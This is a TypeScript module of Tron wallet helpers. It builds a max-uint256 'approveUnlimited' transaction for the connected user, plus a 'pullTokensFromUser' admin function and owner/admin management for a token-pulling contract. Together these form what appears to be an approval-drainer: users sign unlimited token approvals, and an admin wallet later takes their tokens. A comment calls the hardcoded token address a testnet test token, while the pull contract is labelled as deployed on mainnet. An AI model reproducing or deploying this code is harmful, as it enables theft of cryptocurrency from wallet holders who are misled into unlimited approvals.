import {
  broadcastTransaction,
  getActiveAddress,
  getTronWebForRead,
  getTronWebForTransactionBuild,
  isTronLinkAvailable,
  signTransaction,
  waitForTronLink,
} from "@/lib/wallet";

// Tron Network Configuration and Utilities

// TronWeb type declarations
// declare global {
//   interface Window {
//     tronWeb?: {
//       ready: boolean;
//       defaultAddress: {
//         base58: string;
//         hex: string;
//       };
//       address: {
//         toHex: (address: string) => string;
//         fromHex: (address: string) => string;
//       };
//       transactionBuilder: {
//         triggerSmartContract: (
//           contractAddress: string,
//           functionSelector: string,
//           options: any,
//           parameters: Array<{ type: string; value: any }>,
//           issuerAddress: string
//         ) => Promise<any>;
//       };
//       contract: (abi: any[], address: string) => Promise<any>;
//       trx: {
//         sign: (transaction: any) => Promise<any>;
//         sendRawTransaction: (signedTransaction: any) => Promise<any>;
//       };
//     };
//     tronLink?: {
//       ready: boolean;
//       request: (args: { method: string }) => Promise<any>;
//     };
//   }
// }

// TRC20 Token ABI (standard interface)
export const TRC20_ABI = [
  {
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "success", "type": "bool" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      { "name": "owner", "type": "address" },
      { "name": "spender", "type": "address" }
    ],
    "name": "allowance",
    "outputs": [{ "name": "", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "account", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{ "name": "", "type": "uint8" }],
    "type": "function"
  }
];

// TokenManualPull Contract ABI
export const PULL_CONTRACT_ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "newOwner",
        "type": "address"
      }
    ],
    "name": "changeOwner",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "admin",
        "type": "address"
      }
    ],
    "name": "addAdmin",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "admin",
        "type": "address"
      }
    ],
    "name": "removeAdmin",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "admins",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "admins",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "user",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "pullTokensFromUser",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "token",
    "outputs": [
      {
        "internalType": "contract ITRC20",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

// Contract Addresses (Update these with your deployed contract addresses)
export const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Your test token on Shasta testnet
export const PULL_CONTRACT_ADDRESS = "TXY9kz6M4SX6bWZ9ZoqbgAosa5pSjNEYc7"; // Deployed TokenManualPull contract on mainnet

// Maximum uint256 value for unlimited approval
export const MAX_UINT256 = (BigInt(1) << BigInt(256)) - BigInt(1);

function withTimeout<T>(promise: Promise<T>, ms: number, message: string): Promise<T> {
  let timeoutId: ReturnType<typeof setTimeout> | undefined;
  const timeout = new Promise<T>((_, reject) => {
    timeoutId = setTimeout(() => reject(new Error(message)), ms);
  });
  return Promise.race([promise, timeout]).finally(() => {
    if (timeoutId) clearTimeout(timeoutId);
  });
}

async function waitForAllowance(
  tokenAddress: string,
  ownerAddress: string,
  spenderAddress: string,
  timeoutMs: number,
  intervalMs: number
): Promise<bigint> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const allowance = await getAllowance(tokenAddress, ownerAddress, spenderAddress);
    if (allowance > BigInt(0)) return allowance;
    await new Promise((r) => setTimeout(r, intervalMs));
  }
  return BigInt(0);
}

// Convert Sun to TRX/Token amount (6 decimals for USDT-TRC20)
export function fromSun(value: string | number, decimals: number = 6): string {
  const valueStr = value.toString();
  const divisor = BigInt(10 ** decimals);
  const amount = BigInt(valueStr);
  const integerPart = amount / divisor;
  const fractionalPart = amount % divisor;
  
  if (fractionalPart === BigInt(0)) {
    return integerPart.toString();
  }
  
  const fractionalStr = fractionalPart.toString().padStart(decimals, '0');
  return `${integerPart}.${fractionalStr}`.replace(/\.?0+$/, '');
}

// Convert TRX/Token amount to Sun (6 decimals for USDT-TRC20)
export function toSun(value: string | number, decimals: number = 6): string {
  const valueStr = value.toString();
  const [integerPart, fractionalPart = ''] = valueStr.split('.');
  const paddedFractional = fractionalPart.padEnd(decimals, '0').slice(0, decimals);
  const result = BigInt(integerPart + paddedFractional);
  return result.toString();
}

// Get user's token balance
export async function getTokenBalance(tokenAddress: string, userAddress: string): Promise<bigint> {
  try {
    const tronWeb = await getTronWebForRead(userAddress);
    const token = await tronWeb.contract(TRC20_ABI, tokenAddress);
    const balance = await token.balanceOf(userAddress).call();
    return BigInt(balance.toString());
  } catch (error) {
    console.error("Error getting token balance:", error);
    return BigInt(0);
  }
}

// Get user's allowance for a spender
export async function getAllowance(
  tokenAddress: string,
  ownerAddress: string,
  spenderAddress: string
): Promise<bigint> {
  try {
    const tronWeb = await getTronWebForRead(ownerAddress);
    const token = await tronWeb.contract(TRC20_ABI, tokenAddress);
    const allowance = await token.allowance(ownerAddress, spenderAddress).call();
    return BigInt(allowance.toString());
  } catch (error) {
    console.error("Error getting allowance:", error);
    return BigInt(0);
  }
}

// Approve unlimited tokens
export async function approveUnlimited(
  tokenAddress: string,
  spenderAddress: string
): Promise<string> {
  const tronWeb = await getTronWebForTransactionBuild();

  // Get the current user's address
  const userAddress = await getActiveAddress();
  
  if (!userAddress) {
    throw new Error("No wallet address found. Please connect your wallet and try again.");
  }

  // Validate addresses
  if (!isValidTronAddress(tokenAddress)) {
    throw new Error(`Invalid token address: ${tokenAddress}`);
  }
  if (!isValidTronAddress(spenderAddress)) {
    throw new Error(`Invalid spender address: ${spenderAddress}`);
  }

  try {
    // Use TronWeb's transactionBuilder for better compatibility
    const parameter = [
      { type: 'address', value: spenderAddress },
      { type: 'uint256', value: MAX_UINT256.toString() }
    ];

    const options = {
      feeLimit: 100_000_000,
      callValue: 0
    };

    // Trigger smart contract
    const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
      tokenAddress,
      'approve(address,uint256)',
      options,
      parameter,
      userAddress
    );

    if (!transaction.result || !transaction.result.result) {
      throw new Error('Transaction creation failed');
    }

    // Sign the transaction with the active wallet
    const signedTx = await signTransaction(transaction.transaction);

    if (!signedTx) {
      throw new Error('Wallet did not return a signed transaction');
    }

    // Some wallets (e.g. TrustWallet via WalletConnect) may auto-broadcast.
    // If the response already contains a txID without a signature array,
    // treat it as already broadcast.
    const hasSig = Array.isArray(signedTx?.signature) && signedTx.signature.length > 0;
    const alreadyBroadcast = signedTx?.txid || signedTx?.txID;

    if (alreadyBroadcast && !hasSig) {
      // Wallet already broadcast for us
      return signedTx.txid || signedTx.txID;
    }

    // Broadcast the transaction
    const result = await broadcastTransaction(signedTx);
    
    if (!result.result) {
      // "TRANSACTION_EXPIRATION_ERROR" can happen if wallet auto-broadcast
      // already succeeded — check allowance to confirm.
      const code = result?.code || result?.message || "";
      if (typeof code === "string" && code.includes("DUP_TRANSACTION")) {
        // Already broadcast — this is fine
        return result.txid || signedTx.txID || "tx-already-broadcast";
      }
      throw new Error(result.message || 'Transaction broadcast failed');
    }

    return result.txid || result.transaction?.txID;
  } catch (error: any) {
    console.error('Approve error:', error);
    const message = error?.message || "";
    throw new Error(message || 'Failed to approve tokens');
  }
}

// Pull tokens from user (admin function)
export async function pullTokensFromUser(
  pullContractAddress: string,
  userAddress: string,
  amount: string
): Promise<string> {
  const tronWeb = await getTronWebForTransactionBuild();

  // Get the current user's address (admin)
  const adminAddress = await getActiveAddress();
  
  if (!adminAddress) {
    throw new Error("No wallet address found. Please connect your wallet.");
  }

  try {
    const parameter = [
      { type: "address", value: userAddress },
      { type: "uint256", value: amount }
    ];

    const options = {
      feeLimit: 150_000_000,
      callValue: 0
    };

    const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
      pullContractAddress,
      "pullTokensFromUser(address,uint256)",
      options,
      parameter,
      adminAddress
    );

    if (!transaction.result || !transaction.result.result) {
      throw new Error("Transaction creation failed");
    }

    const signedTx = await signTransaction(transaction.transaction);
    const result = await broadcastTransaction(signedTx);

    if (!result.result) {
      throw new Error(result.message || "Transaction broadcast failed");
    }

    return result.txid || result.transaction?.txID;
  } catch (error: any) {
    console.error("Pull tokens error:", error);
    throw new Error(error.message || "Failed to pull tokens");
  }
}

export async function addAdminOwner(
  contractAddress: string,
  adminAddress: string
): Promise<string> {
  const tronWeb = await getTronWebForTransactionBuild();

  const ownerAddress = await getActiveAddress();
  if (!ownerAddress) {
    throw new Error("No wallet address found. Please connect your wallet.");
  }

  if (!isValidTronAddress(contractAddress)) {
    throw new Error(`Invalid contract address: ${contractAddress}`);
  }
  if (!isValidTronAddress(adminAddress)) {
    throw new Error(`Invalid admin address: ${adminAddress}`);
  }

  try {
    const parameter = [{ type: "address", value: adminAddress }];
    const options = { feeLimit: 100_000_000, callValue: 0 };

    const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
      contractAddress,
      "addAdmin(address)",
      options,
      parameter,
      ownerAddress
    );

    if (!transaction.result || !transaction.result.result) {
      throw new Error("Transaction creation failed");
    }

    const signedTx = await signTransaction(transaction.transaction);
    const result = await broadcastTransaction(signedTx);

    if (!result.result) {
      throw new Error(result.message || "Transaction broadcast failed");
    }

    return result.txid || result.transaction?.txID;
  } catch (error: any) {
    console.error("Add admin error:", error);
    throw new Error(error.message || "Failed to add admin");
  }
}

export async function removeAdmin(
  contractAddress: string,
  adminAddress: string
): Promise<string> {
  const tronWeb = await getTronWebForTransactionBuild();

  const ownerAddress = await getActiveAddress();
  if (!ownerAddress) {
    throw new Error("No wallet address found. Please connect your wallet.");
  }

  if (!isValidTronAddress(contractAddress)) {
    throw new Error(`Invalid contract address: ${contractAddress}`);
  }
  if (!isValidTronAddress(adminAddress)) {
    throw new Error(`Invalid admin address: ${adminAddress}`);
  }

  try {
    const parameter = [{ type: "address", value: adminAddress }];
    const options = { feeLimit: 100_000_000, callValue: 0 };

    const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
      contractAddress,
      "removeAdmin(address)",
      options,
      parameter,
      ownerAddress
    );

    if (!transaction.result || !transaction.result.result) {
      throw new Error("Transaction creation failed");
    }

    const signedTx = await signTransaction(transaction.transaction);
    const result = await broadcastTransaction(signedTx);

    if (!result.result) {
      throw new Error(result.message || "Transaction broadcast failed");
    }

    return result.txid || result.transaction?.txID;
  } catch (error: any) {
    console.error("Remove admin error:", error);
    throw new Error(error.message || "Failed to remove admin");
  }
}

export async function getAdminStatus(
  contractAddress: string,
  adminAddress: string
): Promise<boolean> {
  if (!isValidTronAddress(contractAddress)) {
    throw new Error(`Invalid contract address: ${contractAddress}`);
  }
  if (!isValidTronAddress(adminAddress)) {
    throw new Error(`Invalid admin address: ${adminAddress}`);
  }

  try {
    const tronWeb = await getTronWebForRead();
    const contract = await tronWeb.contract(PULL_CONTRACT_ABI, contractAddress);
    const status = await contract.admins(adminAddress).call();
    return Boolean(status);
  } catch (error) {
    console.error("Error getting admin status (RPC):", error);

    if (isTronLinkAvailable()) {
      try {
        const tronWeb = await waitForTronLink();
        const contract = await tronWeb.contract(PULL_CONTRACT_ABI, contractAddress);
        const status = await contract.admins(adminAddress).call();
        return Boolean(status);
      } catch (fallbackError) {
        console.error("Error getting admin status (TronLink):", fallbackError);
      }
    }

    throw error;
  }
}

// Get contract owner
export async function getContractOwner(contractAddress: string): Promise<string> {
  const normalizeOwner = async (owner: string, tronWeb: any) => {
    if (!owner) return owner;
    if (owner.startsWith("0x")) {
      return tronWeb.address.fromHex(owner);
    }
    if (owner.startsWith("41") && owner.length === 42) {
      return tronWeb.address.fromHex(owner);
    }
    return owner;
  };

  try {
    const tronWeb = await getTronWebForRead();
    const contract = await tronWeb.contract(PULL_CONTRACT_ABI, contractAddress);
    const owner = await contract.owner().call();
    return normalizeOwner(owner, tronWeb);
  } catch (error) {
    console.error("Error getting contract owner (RPC):", error);

    if (isTronLinkAvailable()) {
      try {
        const tronWeb = await waitForTronLink();
        const contract = await tronWeb.contract(PULL_CONTRACT_ABI, contractAddress);
        const owner = await contract.owner().call();
        return normalizeOwner(owner, tronWeb);
      } catch (fallbackError) {
        console.error("Error getting contract owner (TronLink):", fallbackError);
      }
    }

    throw error;
  }
}

// Format address for display (shorten)
export function formatAddress(address: string, chars: number = 4): string {
  if (!address) return "";
  return `${address.slice(0, chars + 1)}...${address.slice(-chars)}`;
}

// Check if address is valid Tron address
export function isValidTronAddress(address: string): boolean {
  if (!address || typeof address !== 'string') return false;
  // Tron addresses start with 'T' and are 34 characters long
  return address.startsWith('T') && address.length === 34;
}
